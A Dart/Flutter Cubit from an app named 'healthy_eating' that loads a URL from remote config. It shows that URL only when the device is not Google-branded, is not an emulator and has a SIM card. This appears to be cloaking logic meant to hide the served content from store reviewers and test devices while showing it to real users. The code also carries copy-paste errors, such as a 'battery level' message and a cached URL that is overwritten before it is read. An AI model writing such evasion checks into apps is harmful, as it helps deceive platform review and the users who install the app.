import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:healthy_eating/blocs/remote_config_state.dart';
import 'package:healthy_eating/common/utils/preference_hhelper.dart';
import 'package:healthy_eating/data/providers/remote_cofing_provider.dart';

class RemoteConfigBloc extends Cubit<RemoteConfigState> {
  final _remoteConfig = RemoteConfigProvider.instance;
  RemoteConfigBloc() : super(RemoteConfigLoading());

  Future<void> getConfig() async {
    emit(RemoteConfigLoading());

    bool isOffline = await _isOffline();

    if (isOffline) {
      emit(RemoteConfigCondition());
      return;
    }

    String url;
    await PreferencesHelper.setString('url', '');
    url = await PreferencesHelper.getString('url');

    if (url.isEmpty) {
      final map = await _remoteConfig.getValue();
      url = map;
    }

    final isGoogleBrand = await _isGoogleBrand();
    final isPhysicalDevice = await _isPhysicalDevice();
    final hasSimCard = await _hasSimCard();

    if (url.isEmpty || isGoogleBrand || !isPhysicalDevice || !hasSimCard) {
      emit(RemoteConfigCondition());
      return;
    }

    await PreferencesHelper.setString('url', url);

    emit(RemoteConfigData(url: url));
  }

  Future<bool> _isGoogleBrand() async {
    final plugin = DeviceInfoPlugin();

    if (Platform.isAndroid) {
      final info = await plugin.androidInfo;

      if (info.brand == 'Google') return true;
    }

    return false;
  }

  Future<bool> _isPhysicalDevice() async {
    bool isPhysicalDevice = false;
    final plugin = DeviceInfoPlugin();

    if (Platform.isAndroid) {
      final info = await plugin.androidInfo;

      if (info.isPhysicalDevice != null) {
        isPhysicalDevice = info.isPhysicalDevice!;
      }
    } else if (Platform.isIOS) {
      final info = await plugin.iosInfo;

      if (info.isPhysicalDevice) {
        isPhysicalDevice = info.isPhysicalDevice;
      }
    }
    return isPhysicalDevice;
  }

  Future<bool> _hasSimCard() async {
    const platform = MethodChannel('sim_card');

    try {
      if (Platform.isAndroid) {
        final bool result = await platform.invokeMethod('getSimCardStatus');
        return result;
      } else if (Platform.isIOS) {
        return false;
      }
      return false;
    } on PlatformException catch (e) {
      print("Failed to get battery level: '${e.message}'.");
      return false;
    }
  }

  Future<bool> _isOffline() async {
  try {
    final result = await InternetAddress.lookup('example.com');
    final isOnline = result.isNotEmpty && result[0].rawAddress.isNotEmpty;
    return !isOnline;
  } on SocketException catch (_) {
    return true;
  }
}
}
